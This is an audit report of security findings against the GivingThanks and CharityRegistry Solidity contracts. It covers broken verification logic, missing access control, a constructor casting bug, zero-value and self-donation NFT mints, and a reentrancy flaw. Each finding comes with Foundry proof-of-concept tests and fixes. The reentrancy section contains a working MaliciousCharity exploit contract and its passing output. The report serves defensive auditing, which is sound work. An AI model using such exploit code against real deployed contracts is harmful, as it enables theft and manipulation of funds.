### [H-1] Unverified Charities Can Receive Donations Due to Incorrect Verification Logic

Submitted by [0xodus](https://profiles.cyfrin.io/u/0xodus)      
            


#### Summary

The `GivingThanks` contract allows donations to charities that are registered but not verified, bypassing the intended `verifyCharity` requirement. This occurs due to a logic flaw in the `isVerified` function in `CharityRegistry`, which incorrectly checks the `registeredCharities` mapping instead of `verifiedCharities`.

#### Vulnerability Details

1. **Root Cause**: In the `GivingThanks` contract, the `donate` function checks charity verification status via `registry.isVerified(charity)`. However, in `CharityRegistry`, the `isVerified` function returns `true` for any registered charity, even if it’s not verified.
2. **Expected Behavior**: Only charities that are both registered and verified should pass the `isVerified` check in `donate`.
3. **Current Behavior**: Any registered charity (even unverified ones) will pass the `isVerified` check, allowing donations to potentially untrusted recipients.

#### Impact

This vulnerability enables donations to charities that have not been vetted by the intended `verifyCharity` process, undermining the verification requirement and allowing unverified charities to receive funds. This could lead to potential misallocation of donated funds or abuse by malicious actors registering as charities without undergoing verification.

#### Tools Used

Manual code review, Foundry

#### Recommendations

1. **Update `isVerified` Logic**: Modify `isVerified` in `CharityRegistry` to return `true` only if the charity is verified by checking `verifiedCharities[charity]`:
   ```diff
   function isVerified(address charity) public view returns (bool) {
   -   return registeredCharities[charity];
   +   return verifiedCharities[charity];
   }
   ```

#### POC

Running the line `forge test -mt testCannotDonateToUnverifiedCharity` with the following set up and test functions:

```javascript
 function setUp() public {
     // Initialize addresses
     admin = makeAddr("admin");
     charity = makeAddr("charity");
     donor = makeAddr("donor");

     // Deploy the CharityRegistry contract as admin
     vm.prank(admin);
     registryContract = new CharityRegistry();

     // Deploy the GivingThanks contract by making it appear as if CharityRegistry is the deployer
     vm.prank(address(registryContract));
     charityContract = new GivingThanks(address(registryContract));

     // Register and verify the charity
     vm.prank(admin);
     registryContract.registerCharity(charity);

     vm.prank(admin);
     registryContract.verifyCharity(charity);
 }

 function testCannotDonateToUnverifiedCharity() public {
     address unverifiedCharity = address(0x4);

     // Unverified charity registers but is not verified
     vm.prank(unverifiedCharity);
     registryContract.registerCharity(unverifiedCharity);

     // Fund the donor
     vm.deal(donor, 10 ether);

     // Donor tries to donate to unverified charity
     vm.prank(donor);
     vm.expectRevert();
     charityContract.donate{value: 1 ether}(unverifiedCharity);
 }   
```

will output

```javascript
Ran 1 test for test/GivingThanks.t.sol:GivingThanksTest
[FAIL: next call did not revert as expected] testCannotDonateToUnverifiedCharity() (gas: 307609)
Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 923.48µs (243.06µs CPU time)
```

This test demonstrates that a donor may make a donation to a unregistered charity.

### [H-02] Missing Access Control in updateRegistry Function

#### Summary

The updateRegistry function lacks access control, allowing any address to change the charity registry address, effectively compromising the entire donation system.

#### Vulnerability Details

```solidity
function updateRegistry(address _registry) public {  // No access control
    registry = CharityRegistry(_registry);
}
```

Test demonstrating vulnerability:
```solidity
function testUpdateRegistryNoAccessControl() public {
    address attacker = makeAddr("attacker");
    address maliciousRegistry = makeAddr("maliciousRegistry");
    
    vm.startPrank(attacker);
    charityContract.updateRegistry(maliciousRegistry);
    assertEq(address(charityContract.registry()), maliciousRegistry);
    vm.stopPrank();
}
```

#### Impact

HIGH severity:

- Any address can change the registry
- Attacker can point to malicious registry that validates fake charities
- Complete compromise of donation verification system
- Potential theft of donations through fake charities

#### Tools Used

- Manual code review
- Foundry testing framework
- Custom access control test

#### Recommendations

1. Add Ownable pattern:

```solidity
contract GivingThanks is ERC721URIStorage, Ownable {
    function updateRegistry(address _registry) public onlyOwner {
        require(_registry != address(0), "Invalid registry address");
        registry = CharityRegistry(_registry);
    }
}
```

2. Or implement role-based access control:

```solidity
contract GivingThanks is ERC721URIStorage, AccessControl {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");

    constructor() {
        _grantRole(ADMIN_ROLE, msg.sender);
    }

    function updateRegistry(address _registry) public onlyRole(ADMIN_ROLE) {
        require(_registry != address(0), "Invalid registry address");
        registry = CharityRegistry(_registry);
    }
}
```

## Medium Severity

### [M-01] Incorrect Casting of `msg.sender` as `CharityRegistry` Contract Breaks Functionality of the `GivingThanks` Contract            



#### Summary

Casting `msg.sender` as the `CharityRegistry` contract address breaks the functionality of the `GivingThanks` contract. Since `msg.sender` is not a `CharityRegistry` contract, the `GivingThanks` contract cannot access necessary functionalities such as verifying the registration and verification of charity organizations.

#### Vulnerability Details

<https://github.com/Cyfrin/2024-11-giving-thanks/blob/main/src/GivingThanks.sol#L16>

```javascript
constructor(address _registry) ERC721("DonationReceipt", "DRC") {
@>   registry = CharityRegistry(msg.sender);
    owner = msg.sender;
    tokenCounter = 0;
}
```
1. Constructor incorrectly casts `msg.sender` as the `CharityRegistry` contract. Therefore breaking the functionality of `GivingThanks` contract
##### POC
- This is a test to show that the donate function will fail.
- Copy the following function into `GivingThanks.t.sol`

```Solidity
function testDonateFails() public {
        uint256 donationAmount = 1 ether;

        // Fund the donor
        vm.deal(donor, 10 ether);

        // Donor donates to the charity
        vm.prank(donor);
        vm.expectRevert();
        charityContract.donate{value: donationAmount}(charity);
    }

```


#### Impact
- This incorrect casting renders the  `GivingThanks` contract unusable for its intended purpose.


#### Tools Used
Manual Review

#### Recommendations
Update the constructor to correctly initialize the `registry` with the address of an existing `CharityRegistry` contract passed as `_registry`

```diff
constructor(address _registry) ERC721("DonationReceipt", "DRC") {
-       registry = CharityRegistry(msg.sender);
+      registry = CharityRegistry(_registry);
        owner = msg.sender;
        tokenCounter = 0;
}
```

### [M-02] Reentrancy in NFT Minting allows Multiple NFTs for Single Donation in GivingThanks.sol

#### Summary

A high severity vulnerability was identified in the GivingThanks.sol contract where the donate() function is vulnerable to reentrancy attacks. This allows malicious actors to mint multiple NFTs with a single donation amount, breaking the core accounting system of the donation platform.

#### Vulnerability Details

The vulnerability exists in the following code section:

```Solidity
function donate(address charity) public payable {
    require(registry.isVerified(charity), "Charity not verified");
    (bool sent,) = charity.call{value: msg.value}("");
    require(sent, "Failed to send Ether");
    // State changes after external call
    _mint(msg.sender, tokenCounter);
    string memory uri = _createTokenURI(msg.sender, block.timestamp, msg.value);
    _setTokenURI(tokenCounter, uri);
    tokenCounter += 1;
}
```

The issue stems from:

&#x20;

1. State changes occurring after the external call to the charity
2. Missing reentrancy protection
3. No application of the checks-effects-interactions pattern

A malicious charity contract can exploit this by:

1. Receiving the initial donation call
2. Using its receive/fallback function to re-enter the donate function
3. Repeating this process multiple times with the same ETH
4. Getting multiple NFTs minted for a single donation amount

## Impact

Through the successful proof of concept, we demonstrated that:

&#x20;

1. A single 1 ETH donation can mint 3 NFTs (original + 2 reentrant calls)
2. The cost per NFT is reduced to 0.33 ETH instead of 1 ETH
3. Multiple donation receipts are created for the same donation
4. The integrity of the donation tracking system is compromised



#### Proof of Concept

The following test demonstrates the vulnerability:

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/GivingThanks.sol";
import "../src/CharityRegistry.sol";
import "@openzeppelin/contracts/utils/Strings.sol";
import "@openzeppelin/contracts/utils/Base64.sol";

contract MaliciousCharity {
    GivingThanks private immutable givingThanks;
    uint256 public attackCount;
    uint256 public constant ATTACK_ROUNDS = 2;
    address public owner;

    constructor(address _givingThanks) {
        givingThanks = GivingThanks(_givingThanks);
        owner = msg.sender;
    }

    receive() external payable {
        if (attackCount < ATTACK_ROUNDS) {
            attackCount++;
            // Forward the same ETH back in a reentrant call
            givingThanks.donate{value: msg.value}(address(this));
        }
    }

    function withdrawEth() external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    function getAttackRounds() public pure returns (uint256) {
        return ATTACK_ROUNDS;
    }
}

contract GivingThanksTest is Test {
    GivingThanks public charityContract;
    CharityRegistry public registryContract;
    MaliciousCharity public maliciousCharity;
    
    address public admin;
    address public donor;
    uint256 public constant DONATION_AMOUNT = 1 ether;

    receive() external payable {}

    function setUp() public {
        admin = makeAddr("admin");
        donor = makeAddr("donor");

        vm.startPrank(admin);
        registryContract = new CharityRegistry();
        charityContract = new GivingThanks(address(registryContract));
        vm.stopPrank();

        vm.startPrank(donor);
        maliciousCharity = new MaliciousCharity(address(charityContract));
        vm.stopPrank();

        vm.startPrank(admin);
        registryContract.registerCharity(address(maliciousCharity));
        registryContract.verifyCharity(address(maliciousCharity));
        charityContract.updateRegistry(address(registryContract));
        vm.stopPrank();
    }

    function testReentrancyNFTExploit() public {
        // Fund the donor
        vm.deal(donor, DONATION_AMOUNT);
        
        uint256 initialTokenCounter = charityContract.tokenCounter();
        
        console.log("Initial token counter:", initialTokenCounter);
        console.log("Initial donor ETH:", DONATION_AMOUNT);
        
        // Perform the attack
        vm.startPrank(donor);
        charityContract.donate{value: DONATION_AMOUNT}(address(maliciousCharity));
        vm.stopPrank();
        
        uint256 finalTokenCounter = charityContract.tokenCounter();
        
        console.log("Final token counter:", finalTokenCounter);
        console.log("Total NFTs minted:", finalTokenCounter - initialTokenCounter);
        console.log("ETH spent per NFT:", DONATION_AMOUNT / (finalTokenCounter - initialTokenCounter));
        
        // Verify exploit results
        assertEq(
            finalTokenCounter,
            initialTokenCounter + maliciousCharity.getAttackRounds() + 1,
            "Multiple NFTs should be minted with single ETH payment"
        );

        // Verify all NFTs were minted to the donor or malicious contract
        for (uint256 i = 0; i < maliciousCharity.getAttackRounds() + 1; i++) {
            address owner = charityContract.ownerOf(initialTokenCounter + i);
            assertTrue(
                owner == donor || owner == address(maliciousCharity),
                "NFT should be owned by donor or malicious contract"
            );
        }

        // Verify we used the same ETH multiple times
        assertEq(
            finalTokenCounter - initialTokenCounter,
            maliciousCharity.getAttackRounds() + 1,
            "Should mint multiple NFTs for single ETH payment"
        );
    }
}
```

```javascript
Ran 1 test for test/GivingThanksReentrancy.t.sol:GivingThanksTest
[PASS] testReentrancyNFTExploit() (gas: 727715)
Logs:
  Initial token counter: 0
  Initial donor ETH: 1000000000000000000
  Final token counter: 3
  Total NFTs minted: 3
  ETH spent per NFT: 333333333333333333

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.22ms (480.66µs CPU time)

Ran 1 test suite in 5.47ms (1.22ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

#### Tools Used

slither . 

Manual review

&#x20;

Foundry test framework

#### Recommendations

Implement the checks-effects-interactions pattern:

```javascript
function donate(address charity) public payable {
    require(registry.isVerified(charity), "Charity not verified");
    
    // Effects before interactions
    uint256 currentTokenId = tokenCounter++;
    _mint(msg.sender, currentTokenId);
    string memory uri = _createTokenURI(msg.sender, block.timestamp, msg.value);
    _setTokenURI(currentTokenId, uri);
    
    // Interactions last
    (bool sent,) = charity.call{value: msg.value}("");
    require(sent, "Failed to send Ether");
}
```

Add OpenZeppelin's ReentrancyGuard:

```javascript
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract GivingThanks is ReentrancyGuard {
    function donate(address charity) public payable nonReentrant {
        ...
    }
}
```

### [M-03] Missing Registry Removal Functionality in `CharityRegistry.sol`
          
**Description**: The contract lacks functionality to remove registered or verified charities, making it impossible to handle compromised or defunct charities.

**Impact**:

* No way to remove malicious charities
* Cannot update registry for defunct organizations
* Permanent storage bloat
* No ability to handle compromised charity addresses

**Recommended Mitigation**: Add functions to remove charities with appropriate access controls.

```javascript
event CharityRemoved(address indexed charity);

function removeCharity(address charity) public onlyAdmin {
    require(registeredCharities[charity], "Charity not registered");
    registeredCharities[charity] = false;
    verifiedCharities[charity] = false;
    emit CharityRemoved(charity);
}
```

## Low Risk Findings

### [L-01] Users can get NFTs sending zero transactions.


#### Summary

The donate function lacks a `check` for msg.value, allowing users to obtain an NFT by sending a transaction with `zero` ether.

#### Vulnerability Details

###### Proof of code:

Add this `code` to tests , but as there is a bug in the constructor of the `GivingThanks`contract , fix it before running tests .

```diff
 constructor(address _registry) ERC721("DonationReceipt", "DRC") {
+      registry = CharityRegistry(_registry); 
-      registry = CharityRegistry(_msg.sender);
        owner = msg.sender;
        tokenCounter = 0;
    }
```

```javascript
function testZeroDonate() public {
        // Check initial token counter
        uint256 initialTokenCounter = charityContract.tokenCounter();

        // Donor donates to the charity zero Ether
        vm.prank(donor);
        charityContract.donate{value: 0}(charity);

        // Check that the NFT was minted
        uint256 newTokenCounter = charityContract.tokenCounter();
        assertEq(newTokenCounter, initialTokenCounter + 1);

        // Verify ownership of the NFT
        address ownerOfToken = charityContract.ownerOf(initialTokenCounter);
        assertEq(ownerOfToken, donor);

        // Verify that the zero donation was sent to the charity
        uint256 charityBalance = charity.balance;
        assertEq(charityBalance, 0);
    }
```

#### Impact

Without a check for `msg.value`, users can call the function `donate` with zero ether and still `receive` an NFT.

#### Tools Used

Manual code review.

#### Recommendations

To address this vulnerability, you should add a check for msg.value in the donate function.

```javascript
function donate(address charity) public payable {
  require(msg.value > 0,"Amount is O");
```

### [L-02] GivingThanks.donate(): Minting unlimited number of NFT tokens by charity 


#### Summary

A verified charity can use their donated funds to donate to themselves and receive `DonationReceipt` tokens in an almost unlimited quantity - limited by the sum of their gas costs vs balance.

#### Vulnerability Details

There is no check that prevents a charity from donating to itself. Therefore, each charity can mint a `DonationReceipt` token as many times as it wants.

#### Impact

The purpose of `DonationReceipt` tokens is to identify donors. However, allowing charities to make donations themselves makes the `DonationReceipt` obsolete. You don't really know if the address on the receipt actually donated eth to a charity.

#### Tools Used

Run the following test in the `GivingThanks.t.sol` test contract.

```js
function testCharityCanMintNFT() public {
        vm.deal(charity, 20 ether);

        uint256 balanceBefore = charity.balance;
        uint256 initialTokenCounter = charityContract.tokenCounter();

        assertEq(initialTokenCounter, 0);

        vm.prank(charity);
        charityContract.donate{value: balanceBefore}(charity);

        uint256 balanceAfter = charity.balance;

        //gas neglected
        assert(balanceBefore == balanceAfter);
        assertEq(charityContract.tokenCounter(), initialTokenCounter + 1);
        assertEq(charityContract.ownerOf(initialTokenCounter), charity);
    }
```

#### Recommendations

Depending on your policy, you may:

* prohibit any registered/verified charity from making donations
* prohibit any verified charity from making donations to itself.





    